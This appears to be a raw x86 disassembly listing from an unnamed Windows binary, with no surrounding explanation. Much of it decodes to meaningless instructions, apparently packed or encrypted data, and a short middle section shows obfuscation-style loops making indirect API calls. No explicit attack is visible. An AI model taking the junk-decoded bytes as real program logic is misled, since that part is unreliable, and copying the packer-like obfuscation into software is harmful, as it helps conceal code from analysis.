  4099fb:	push   ds
  4099fc:	xchg   DWORD PTR [ecx+0x61],ebp
  4099ff:	out    0xad,eax
  409a01:	popa   
  409a02:	lods   eax,DWORD PTR ds:[esi]
  409a03:	mov    ds:0x38d504cc,eax
  409a08:	and    eax,0xd375ef9e
  409a0d:	mov    ebp,0x9cfb70ae
  409a12:	dec    esp
  409a13:	cwde   
  409a14:	jo     0x409a42
  409a16:	and    eax,0x62e03682
  409a1b:	ret    0x8bef
  409a1e:	addr16 inc ebx
  409a20:	xchg   ebp,eax
  409a21:	leave  
  409a22:	(bad)  
  409a23:	or     BYTE PTR [eax+0x36406093],ch
  409a29:	sahf   
  409a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a2b:	mov    dl,0x48
  409a2d:	cmp    ch,BYTE PTR [edx+eax*4+0x69d94a80]
  409a34:	mov    cl,0x6
  409a36:	sbb    BYTE PTR [eax-0x13],ch
  409a39:	mov    bh,0xdc
  409a3b:	jp     0x409a51
  409a3d:	inc    ebp
  409a3e:	dec    esp
  409a3f:	fist   DWORD PTR [edx]
  409a41:	leave  
  409a42:	jmp    0x1e51:0xcf7af8dd
  409a49:	sahf   
  409a4a:	fstp   DWORD PTR [eax-0x80]
  409a4d:	outs   dx,BYTE PTR fs:[esi]
  409a4f:	(bad)  
  409a50:	mov    esi,0xc1f4044d
  409a55:	popf   
  409a56:	ror    DWORD PTR [ecx],cl
  409a58:	fld    QWORD PTR [edi+0x73]
  409a5b:	das    
  409a5c:	sub    ebx,0xffffffcd
  409a5f:	mov    DWORD PTR [edi],ecx
  409a61:	mov    ch,BYTE PTR [esi+0x5bec516e]
  409a67:	add    al,0x74
  409a69:	mov    ah,0xc7
  409a6b:	mov    cl,0xba
  409a6d:	add    eax,DWORD PTR [eax-0x29]
  409a70:	into   
  409a71:	std    
  409a72:	cmp    al,0xe9
  409a74:	mov    ds:0x79dcabcf,eax
  409a79:	sub    al,0xdb
  409a7b:	xor    al,0x7
  409a7e:	sbb    eax,eax
  409a80:	ret    
  409a81:	inc    ecx
  409a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a83:	jge    0x409a77
  409a85:	clc    
  409a86:	mov    ch,0xfc
  409a88:	and    al,0xac
  409a8a:	xor    bh,BYTE PTR [esi]
  409a8c:	sbb    esp,DWORD PTR [ebp+0x1b]
  409a8f:	jnp    0x409a17
  409a91:	push   esp
  409a92:	or     bl,BYTE PTR [ebx-0x79]
  409a95:	ds xchg ecx,eax
  409a97:	jo     0x409aba
  409a99:	jp     0x409adb
  409a9b:	retf   0x881
  409a9e:	xchg   ecx,eax
  409a9f:	test   dh,0xbf
  409aa2:	iret   
  409aa3:	(bad)  
  409aa4:	cdq    
  409aa5:	mov    ebx,0x1cc6d39d
  409aaa:	push   esi
  409aab:	adc    dl,BYTE PTR [ebx-0x1266271]
  409ab1:	sub    dl,BYTE PTR [ebx+0x8a35ca4]
  409ab7:	div    DWORD PTR [ecx-0x53]
  409aba:	jecxz  0x409ad1
  409abc:	add    eax,0x751925e6
  409ac1:	add    eax,0xb15a5d73
  409ac6:	and    BYTE PTR [edx-0x64b509dc],al
  409acc:	loop   0x409ad9
  409ace:	fsubp  st(3),st
  409ad0:	clc    
  409ad1:	dec    ebx
  409ad2:	push   0x58367ca2
  409ad7:	jnp    0x409b4b
  409ad9:	pop    es
  409ada:	dec    esp
  409adb:	adc    dh,0x16
  409ade:	sbb    dl,BYTE PTR [edi+0x3dbb6bf5]
  409ae4:	iret   
  409ae5:	ins    BYTE PTR es:[edi],dx
  409ae6:	sub    al,0xe
  409ae8:	or     eax,0xf3680a52
  409aed:	(bad)  
  409aee:	cwde   
  409aef:	jb     0x409aac
  409af1:	push   es
  409af2:	sub    ah,0x21
  409af5:	scas   al,BYTE PTR es:[edi]
  409af6:	push   ebp
  409af7:	and    eax,0x8878c6ad
  409afc:	test   al,0x94
  409afe:	adc    eax,0xfd5ba1d8
  409b03:	and    al,BYTE PTR [ecx+ecx*2+0x27]
  409b07:	ror    BYTE PTR [edx+0x2e],cl
  409b0a:	jmp    0x409af3
  409b0c:	xchg   edi,eax
  409b0d:	and    eax,0x80847b71
  409b12:	repnz add esi,esp
  409b15:	(bad)  
  409b16:	cmp    bh,al
  409b18:	or     esp,DWORD PTR [ebx+ebp*1-0x73]
  409b1c:	pop    ebp
  409b1d:	mov    ebp,0xfd1b63ef
  409b22:	cmc    
  409b23:	or     al,0x29
  409b25:	mov    edx,0x1e0baa51
  409b2a:	shl    DWORD PTR [eax+0xf],1
  409b2d:	add    BYTE PTR [ebx+esi*8],dh
  409b30:	push   ds
  409b31:	mov    eax,0xb4299361
  409b36:	and    DWORD PTR [ecx+0x16787e33],0xffffffd1
  409b3d:	ficomp DWORD PTR [esi+0x6c23a18e]
  409b43:	inc    ebx
  409b44:	aad    0x19
  409b46:	dec    ebp
  409b47:	add    ebx,DWORD PTR [esi]
  409b49:	(bad)  
  409b4a:	cs adc eax,0x6667286
  409b50:	push   0xffffffd8
  409b52:	add    BYTE PTR [ecx+0x4e8004c2],al
  409b58:	jno    0x409b8e
  409b5a:	mov    WORD PTR fs:[edi+0x60],?
  409b5e:	int    0x7d
  409b60:	sub    DWORD PTR gs:[eax+0x2ad2c26d],edx
  409b67:	sbb    BYTE PTR [esi+eiz*8-0x32991c45],bl
  409b6e:	jle    0x409b2e
  409b70:	or     BYTE PTR [esp+ecx*2+0x35b516ee],dh
  409b77:	lahf   
  409b78:	(bad)  
  409b79:	mov    ds:0x7985f18e,eax
  409b7e:	inc    ebx
  409b7f:	xor    BYTE PTR [esi+0x14e8fa34],dh
  409b85:	pop    edi
  409b86:	test   al,0xb3
  409b88:	xor    al,bl
  409b8a:	ror    BYTE PTR ds:0x1300ce20,cl
  409b90:	or     BYTE PTR [edi+edx*1],bh
  409b93:	xchg   edi,eax
  409b94:	gs ss pushf 
  409b97:	mov    edx,0x80dec695
  409b9c:	jmp    0x409b31
  409b9e:	push   edi
  409b9f:	and    eax,0xccb6cb7
  409ba4:	data16 cmp ch,BYTE PTR [ebx-0x319c4e3d]
  409bab:	and    eax,0xe86ec1e
  409bb0:	scas   al,BYTE PTR es:[edi]
  409bb1:	push   edi
  409bb2:	xchg   esi,eax
  409bb3:	jecxz  0x409bac
  409bb5:	arpl   WORD PTR [ecx-0x46aec27c],sp
  409bbb:	dec    ebx
  409bbc:	rcr    edx,cl
  409bbe:	sbb    esi,eax
  409bc0:	mov    ds,WORD PTR [ebx]
  409bc2:	push   ebp
  409bc3:	in     eax,0x74
  409bc5:	arpl   WORD PTR [eax],bx
  409bc7:	les    ebp,FWORD PTR [eax]
  409bc9:	xchg   esi,eax
  409bca:	retf   0x86d
  409bcd:	cmc    
  409bce:	dec    eax
  409bcf:	ret    
  409bd0:	shr    BYTE PTR [edi],1
  409bd2:	mov    dl,BYTE PTR [ebp+0x632c3258]
  409bd8:	pusha  
  409bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bda:	mov    ds:0xf00d9dc7,eax
  409bdf:	cmp    eax,0x2c86a6f2
  409be4:	xchg   BYTE PTR [edi+0x75],dl
  409be7:	pop    eax
  409be8:	loopne 0x409bb4
  409bea:	shl    BYTE PTR [ecx-0x5d],1
  409bed:	or     ebp,DWORD PTR [ebp-0x18b899b9]
  409bf3:	out    0xb3,eax
  409bf5:	push   ecx
  409bf6:	or     DWORD PTR [eax+0x35],esi
  409bf9:	cld    
  409bfa:	jmp    0x2f2e5fdb
  409bff:	inc    edx
  409c00:	nop
  409c01:	xlat   BYTE PTR ds:[ebx]
  409c02:	in     eax,0x89
  409c04:	mov    edi,0xfb0126ac
  409c09:	xchg   DWORD PTR [esi],ebp
  409c0b:	sbb    eax,0x412b02bc
  409c10:	fistp  DWORD PTR [edx-0x7b]
  409c13:	mov    dh,0x8
  409c15:	sbb    eax,DWORD PTR [ebp+0x5edd71c6]
  409c1b:	mov    dl,0x64
  409c1d:	(bad)  
  409c1f:	or     eax,0x68507da0
  409c24:	leave  
  409c25:	es mov bh,0xf
  409c28:	(bad)  
  409c2a:	cli    
  409c2b:	push   es
  409c2c:	(bad)  
  409c2d:	loope  0x409c22
  409c2f:	xchg   ecx,eax
  409c30:	(bad)  
  409c31:	mov    eax,0x9993eb4c
  409c36:	xor    eax,0x55ebfb62
  409c3b:	mov    edi,DWORD PTR [eax]
  409c3d:	xlat   BYTE PTR ds:[ebx]
  409c3e:	cmp    BYTE PTR [ebx+0x7a506ed5],ah
  409c44:	scas   eax,DWORD PTR es:[edi]
  409c45:	cmp    esp,edx
  409c47:	loop   0x409cbf
  409c49:	clc    
  409c4a:	xor    DWORD PTR [ecx-0x56],esi
  409c4d:	fcmovne st,st(5)
  409c4f:	aam    0xb6
  409c51:	mov    dh,0x4d
  409c53:	sahf   
  409c54:	jne    0x409bdf
  409c56:	ds fs pusha 
  409c59:	into   
  409c5a:	dec    ecx
  409c5b:	in     al,dx
  409c5c:	in     eax,dx
  409c5d:	setne  bl
  409c60:	cdq    
  409c61:	adc    eax,0xa4f0d288
  409c66:	mov    ebx,ebp
  409c68:	test   DWORD PTR [eax-0x4a],esp
  409c6b:	and    ecx,DWORD PTR [ecx]
  409c6d:	(bad)  
  409c6e:	xchg   edi,eax
  409c6f:	int3   
  409c70:	cmp    edi,0xff226cf2
  409c76:	out    0xfd,al
  409c78:	sbb    ecx,DWORD PTR [ebp-0x5b]
  409c7b:	sbb    al,0x49
  409c7d:	repz and BYTE PTR [ebx+edi*1+0x54],0xe1
  409c83:	sbb    cl,BYTE PTR [ebp+0x51]
  409c86:	adc    dh,BYTE PTR ds:0xfc6adc2a
  409c8c:	inc    ebx
  409c8d:	jp     0x409c77
  409c8f:	outs   dx,BYTE PTR ds:[esi]
  409c90:	jmp    0x729e:0xcd303461
  409c97:	jb     0x409c58
  409c99:	and    al,0x89
  409c9b:	mov    edx,0x31f5aca0
  409ca0:	or     eax,DWORD PTR [eax-0x6a]
  409ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ca4:	ret    0xd2f5
  409ca7:	jo     0x409d11
  409ca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409caa:	xor    dl,ah
  409cac:	fld    QWORD PTR [esi+0x6d]
  409caf:	mov    esp,DWORD PTR [edi]
  409cb1:	pop    eax
  409cb2:	fwait
  409cb3:	test   al,0x14
  409cb5:	push   edx
  409cb6:	or     al,0x3
  409cb8:	lds    ebp,FWORD PTR gs:[eax+0x5e]
  409cbc:	sbb    DWORD PTR [edi+edi*2+0x4e],esp
  409cc0:	sub    bl,bl
  409cc2:	jmp    0x36c3:0x5ca8910a
  409cc9:	xchg   ebx,eax
  409cca:	xor    eax,0x68ed0500
  409ccf:	retf   
  409cd0:	je     0x409d3c
  409cd2:	inc    ebx
  409cd3:	in     eax,0x9b
  409cd5:	(bad)  
  409cd6:	push   ecx
  409cd7:	pusha  
  409cd8:	adc    BYTE PTR [ecx-0x10],al
  409cdb:	or     cl,ah
  409cdd:	ja     0x409d5e
  409cdf:	sub    al,0x70
  409ce1:	add    al,0xdd
  409ce3:	test   eax,0x7d8191f2
  409ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ce9:	pop    es
  409cea:	stos   BYTE PTR es:[edi],al
  409ceb:	ret    
  409cec:	mov    es,ebp
  409cee:	adc    eax,0x41998265
  409cf3:	sub    al,0x95
  409cf5:	jb     0x409ce3
  409cf7:	or     DWORD PTR [esi-0x9b2c5e3],ebp
  409cfd:	push   ds
  409cfe:	jmp    FWORD PTR [edi-0x5cee5811]
  409d04:	push   ds
  409d05:	xor    bl,BYTE PTR [edi]
  409d07:	xor    esp,DWORD PTR [ebx+0x2d]
  409d0a:	in     al,dx
  409d0b:	or     bl,bh
  409d0d:	sub    eax,0x9c49a259
  409d12:	mov    bl,0xd4
  409d14:	and    BYTE PTR [esi+esi*8],bh
  409d17:	sub    BYTE PTR [edi+0x40],bh
  409d1a:	sub    al,0x71
  409d1c:	xor    BYTE PTR [esp+eiz*4+0x7],dl
  409d20:	jnp    0x409cda
  409d22:	mov    al,0xf3
  409d24:	jle    0x409cd4
  409d26:	xor    ecx,DWORD PTR [ebp+0x24]
  409d29:	test   BYTE PTR [ebp+0xcb5cf88],ah
  409d2f:	xchg   edx,eax
  409d30:	sar    BYTE PTR [edi-0x3d],1
  409d33:	cwde   
  409d34:	fbld   TBYTE PTR [ebx+0x41b72237]
  409d3a:	aaa    
  409d3b:	cwde   
  409d3c:	loope  0x409cdb
  409d3e:	pop    ss
  409d3f:	mov    dl,0x8b
  409d41:	jl     0x409d7d
  409d43:	outs   dx,BYTE PTR ds:[esi]
  409d44:	jle    0x409d74
  409d46:	sbb    al,0xe3
  409d48:	push   ecx
  409d49:	xlat   BYTE PTR ds:[ebx]
  409d4a:	adc    eax,0xd7190791
  409d4f:	mov    al,BYTE PTR [ebp-0x29]
  409d52:	or     dh,BYTE PTR [ecx+ecx*8-0x3f03ad34]
  409d59:	sub    DWORD PTR [edi-0x2dd30c9a],ecx
  409d5f:	cmp    al,0xd1
  409d61:	mov    edx,0xefb957c2
  409d66:	push   ss
  409d67:	fild   DWORD PTR [eax+0x53]
  409d6a:	xor    BYTE PTR [edx+0x73],0x59
  409d6e:	adc    dh,ah
  409d70:	out    0x5c,eax
  409d72:	pop    ebx
  409d73:	je     0x409d8e
  409d75:	xchg   edi,eax
  409d76:	into   
  409d77:	sahf   
  409d78:	mov    bh,0x25
  409d7a:	ds ins BYTE PTR es:[edi],dx
  409d7c:	fsub   QWORD PTR [edi+0x205ac3b]
  409d82:	jns    0x409dc0
  409d84:	fisubr WORD PTR [ecx+eax*8]
  409d87:	test   ah,bl
  409d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d8a:	add    ebx,ebp
  409d8c:	fdiv   DWORD PTR [esi]
  409d8e:	xor    DWORD PTR [ebp-0x4b1862c],ebp
  409d94:	or     BYTE PTR [ebx+0x3aa450e5],ch
  409d9a:	fmul   st(6),st
  409d9c:	jmp    0x9f61:0x738503e2
  409da3:	mov    bh,0xe4
  409da5:	(bad)  
  409da7:	mov    dl,0x90
  409da9:	inc    esp
  409daa:	adc    DWORD PTR [edi-0x2a67d2f9],esp
  409db0:	inc    eax
  409db1:	loop   0x409d85
  409db3:	ror    ebx,1
  409db5:	inc    ecx
  409db6:	out    dx,eax
  409db7:	push   ebp
  409db8:	or     al,BYTE PTR [ebp-0x65e7ffd7]
  409dbe:	std    
  409dbf:	out    0xd9,eax
  409dc1:	ficom  DWORD PTR [edi-0x2a]
  409dc4:	mov    DWORD PTR [ecx+ebp*1],esp
  409dc7:	lea    edi,[eax-0xd]
  409dca:	test   BYTE PTR [edi+0x72],ch
  409dcd:	adc    esp,esp
  409dcf:	pop    esi
  409dd0:	sub    al,0xe8
  409dd2:	stos   BYTE PTR es:[edi],al
  409dd3:	mov    ebp,0x71d0816e
  409dd8:	sbb    DWORD PTR [ecx-0x13],0xffffff9b
  409ddc:	jo     0x409daa
  409dde:	div    BYTE PTR [edi-0x7d0f6dae]
  409de4:	sub    al,0x3a
  409de6:	push   ebx
  409de7:	inc    ebp
  409de8:	imul   esp,DWORD PTR [ecx+0x58],0x6397cb99
  409def:	mov    edx,DWORD PTR [esi+0x7a980530]
  409df5:	jp     0x409dff
  409df7:	inc    ebp
  409df8:	jnp    0x409e18
  409dfa:	sahf   
  409dfb:	pop    ss
  409dfc:	mov    edi,DWORD PTR [edx*1-0x14c6a0ee]
  409e03:	rol    BYTE PTR [edi],0x61
  409e06:	mov    al,0xe1
  409e08:	xlat   BYTE PTR ds:[ebx]
  409e09:	sbb    ebx,DWORD PTR [esi]
  409e0b:	mov    eax,0x6b12d04b
  409e10:	fwait
  409e11:	rol    bl,cl
  409e13:	pop    edx
  409e14:	imul   DWORD PTR [esi+0x72]
  409e17:	(bad)  
  409e18:	stc    
  409e19:	retf   
  409e1a:	rcl    DWORD PTR [edx],1
  409e1c:	add    ah,al
  409e1e:	leave  
  409e1f:	push   0xffffff89
  409e21:	or     DWORD PTR [eax-0x7fd84c3b],0x76
  409e28:	jecxz  0x409dca
  409e2a:	adc    eax,0x9dc20c3b
  409e2f:	xor    esp,DWORD PTR [ebx+0x5f58decf]
  409e35:	dec    ebx
  409e36:	out    dx,al
  409e37:	or     al,0x71
  409e39:	mov    cs,WORD PTR [eax-0x1d]
  409e3c:	or     al,0x2c
  409e3e:	or     edx,DWORD PTR [edi]
  409e40:	sbb    ebp,eax
  409e42:	inc    esp
  409e43:	xor    ecx,DWORD PTR [eax]
  409e45:	sti    
  409e46:	cmp    BYTE PTR [esi],dh
  409e48:	xchg   edi,eax
  409e49:	cmp    DWORD PTR [edi+eax*2],edi
  409e4c:	or     eax,0x4d05406b
  409e51:	clc    
  409e52:	push   eax
  409e53:	pop    ebp
  409e54:	adc    edx,DWORD PTR [ebx+0x5f]
  409e57:	push   ds
  409e58:	mov    esp,gs
  409e5a:	rol    DWORD PTR ds:0x908a6b58,1
  409e60:	fimul  DWORD PTR [ebp+0x34]
  409e63:	inc    esi
  409e64:	xchg   DWORD PTR [ebp-0x6bea19c7],esp
  409e6a:	mov    bh,0x94
  409e6c:	test   eax,0x79e8c2d9
  409e71:	fild   QWORD PTR ds:0x39085b84
  409e77:	mov    ecx,0x9fc332f7
  409e7c:	jne    0x409e6a
  409e7e:	icebp  
  409e7f:	or     DWORD PTR [esi+0x9f221b3],edi
  409e85:	mov    dl,0x72
  409e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e88:	inc    esp
  409e89:	pop    edi
  409e8a:	mov    ebp,0x3d109741
  409e8f:	aas    
  409e90:	ja     0x409e64
  409e92:	fnstenv [edx]
  409e94:	xchg   BYTE PTR [ebp-0x4c9a98a6],bh
  409e9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e9b:	std    
  409e9c:	sbb    eax,0x5ee567a0
  409ea1:	xchg   DWORD PTR [edi-0x47023ecb],eax
  409ea7:	arpl   WORD PTR [esi-0x72],si
  409eaa:	(bad)  
  409eab:	in     eax,0x1
  409ead:	pushf  
  409eae:	push   eax
  409eaf:	aam    0xfb
  409eb1:	aam    0x14
  409eb3:	mov    bh,0x2c
  409eb5:	mov    al,0x87
  409eb7:	cmp    DWORD PTR [esp+esi*1-0x5c],edi
  409ebb:	mov    eax,0x28fd5b68
  409ec0:	cmc    
  409ec1:	and    edi,DWORD PTR [edi-0x33a4f7e8]
  409ec7:	push   es
  409ec8:	fwait
  409ec9:	neg    BYTE PTR [ebx+0x5]
  409ecc:	xor    al,0x33
  409ece:	cmc    
  409ecf:	mov    al,0xdb
  409ed1:	hlt    
  409ed2:	clc    
  409ed3:	out    dx,al
  409ed4:	dec    ecx
  409ed5:	or     eax,0x5facb6d4
  409eda:	jecxz  0x409e73
  409edc:	push   ds
  409edd:	mov    ecx,esp
  409edf:	lock imul eax,DWORD PTR [edx+0x11],0x5a
  409ee4:	sti    
  409ee5:	jmp    0x409f22
  409ee7:	ror    BYTE PTR [edi],1
  409ee9:	sahf   
  409eea:	inc    eax
  409eeb:	aad    0x15
  409eed:	lea    ecx,[ecx]
  409eef:	push   ss
  409ef0:	dec    ebx
  409ef1:	retf   0xcb88
  409ef4:	loope  0x409eca
  409ef6:	adc    BYTE PTR [edi],ch
  409ef8:	(bad)  
  409ef9:	scas   al,BYTE PTR es:[edi]
  409efa:	fmul   DWORD PTR [ebp+0x56579037]
  409f00:	push   esi
  409f01:	fs pop esi
  409f03:	(bad)  
  409f05:	rcl    BYTE PTR [eax+edx*4],1
  409f08:	mov    cl,0xa0
  409f0a:	cmp    eax,0xa1315839
  409f0f:	ins    DWORD PTR es:[edi],dx
  409f10:	mov    ecx,0x7acfc76
  409f15:	pop    ebx
  409f16:	adc    DWORD PTR [edi-0x1e797f05],edx
  409f1c:	push   ss
  409f1d:	fxch   st(3)
  409f1f:	(bad)  
  409f21:	sti    
  409f22:	mov    edx,0x837345df
  409f27:	outs   dx,BYTE PTR ds:[esi]
  409f28:	mov    esp,0xc48614ee
  409f2d:	jecxz  0x409ec9
  409f2f:	test   DWORD PTR ds:0x297e35e0,esp
  409f35:	cmp    al,0xdd
  409f37:	mov    ds:0x28627b90,eax
  409f3c:	hlt    
  409f3d:	jns    0x409ee8
  409f3f:	shr    DWORD PTR [edi],0x7d
  409f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f43:	ins    BYTE PTR es:[edi],dx
  409f44:	cmp    BYTE PTR [eax],dh
  409f46:	mov    eax,ds:0x1f72cb17
  409f4b:	pop    esi
  409f4c:	pop    ebp
  409f4d:	add    ebp,esi
  409f4f:	and    al,0x83
  409f51:	jecxz  0x409f38
  409f53:	jae    0x409fce
  409f55:	inc    edx
  409f56:	ins    BYTE PTR es:[edi],dx
  409f57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f58:	sahf   
  409f59:	jo     0x409fa8
  409f5b:	(bad)  
  409f5c:	je     0x409f3c
  409f5e:	popw   es
  409f60:	jne    0x409ee2
  409f62:	lea    ebp,[edi+0x5b]
  409f65:	leave  
  409f66:	imul   edi,DWORD PTR [ebp+0x423fd66a],0xffffffc0
  409f6d:	bound  ebx,QWORD PTR [ebx-0x5245ea5b]
  409f73:	xor    bp,sp
  409f76:	or     al,0x4c
  409f78:	or     eax,0x2203c9b0
  409f7d:	in     al,0x2b
  409f7f:	jge    0x409ffa
  409f81:	mov    eax,DWORD PTR [eax+0x198]
  409f87:	and    DWORD PTR ds:0x429008,0x0
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
  40a1aa:	xor    eax,ecx
  40a1ac:	add    eax,edx
  40a1ae:	mov    DWORD PTR ds:0x429018,0x1094
  40a1b8:	imul   eax,DWORD PTR [esi]
  40a1bb:	and    DWORD PTR ds:0x42900c,0x0
  40a1c5:	mov    esi,DWORD PTR ds:0x42900c
  40a1cb:	inc    esi
  40a1cc:	mov    DWORD PTR ds:0x42900c,esi
  40a1d2:	cmp    DWORD PTR ds:0x42900c,0x1f
  40a1d9:	jne    0x40a1e8
  40a1df:	push   DWORD PTR [ebp-0x10]
  40a1e2:	call   DWORD PTR ds:0x42e8b7
  40a1e8:	cmp    DWORD PTR ds:0x42900c,0x1d
  40a1ef:	jb     0x40a1c5
  40a1f5:	mov    esi,DWORD PTR [ebp+0x8]
  40a1f8:	xor    esi,ecx
  40a1fa:	add    esi,edx
  40a1fc:	cmp    esi,eax
  40a1fe:	mov    eax,DWORD PTR [ebp-0x4]
  40a201:	push   ebx
  40a202:	je     0x40a221
  40a208:	mov    esi,DWORD PTR [ebp-0x18]
  40a20b:	add    DWORD PTR [eax],esi
  40a20d:	mov    eax,DWORD PTR [ebp-0x4]
  40a210:	mov    esi,DWORD PTR [ebp+0xc]
  40a213:	xor    esi,ecx
  40a215:	add    esi,edx
  40a217:	imul   esi,DWORD PTR [eax]
  40a21a:	mov    DWORD PTR [eax],esi
  40a21c:	jmp    0x40a226
  40a221:	mov    esi,DWORD PTR [ebp+0x14]
  40a224:	xor    DWORD PTR [eax],esi
  40a226:	mov    eax,DWORD PTR [ebp-0x4]
  40a229:	mov    edi,DWORD PTR [ebp+0x10]
  40a22c:	xor    edi,ecx
  40a22e:	mov    esi,0xffcd8d1e
  40a233:	mov    ebx,esi
  40a235:	sub    ebx,edi
  40a237:	add    DWORD PTR [eax],ebx
  40a239:	mov    eax,DWORD PTR [ebp-0x4]
  40a23c:	mov    edi,DWORD PTR [ebp-0x8]
  40a23f:	jmp    0x40c58e
  40a244:	pusha  
  40a245:	sub    DWORD PTR [ebx-0x11],eax
  40a248:	repz ja 0x40a1fb
  40a24b:	xchg   ebx,eax
  40a24c:	cli    
  40a24d:	adc    bl,ah
  40a24f:	je     0x40a290
  40a251:	inc    edx
  40a252:	jge    0x40a286
  40a254:	rol    BYTE PTR ds:0x5f4e7c7c,1
  40a25a:	jl     0x40a2d8
  40a25c:	xor    ecx,DWORD PTR [edi]
  40a25e:	inc    eax
  40a25f:	mov    BYTE PTR [esi],cl
  40a261:	outs   dx,DWORD PTR ds:[esi]
  40a262:	pop    ss
  40a263:	xlat   BYTE PTR ds:[ebx]
  40a264:	inc    ebx
  40a265:	retf   
  40a266:	adc    BYTE PTR [esi+ecx*2],dh
  40a269:	jmp    0x40a254
  40a26b:	inc    edi
  40a26c:	or     BYTE PTR [esi],bl
  40a26e:	rol    DWORD PTR [eax+edx*4-0x2a],cl
  40a272:	mov    esi,0x413c8e59
  40a277:	jl     0x40a29d
  40a279:	into   
  40a27a:	cmp    ecx,DWORD PTR [esi]
  40a27c:	or     eax,0x512402b3
  40a281:	push   esp
  40a282:	fwait
  40a283:	mov    ds:0x8ee51bdf,eax
  40a288:	push   cs
  40a289:	std    
  40a28a:	out    0xa2,al
  40a28c:	mov    eax,0xdc5d2400
  40a291:	push   es
  40a292:	jbe    0x40a2da
  40a294:	into   
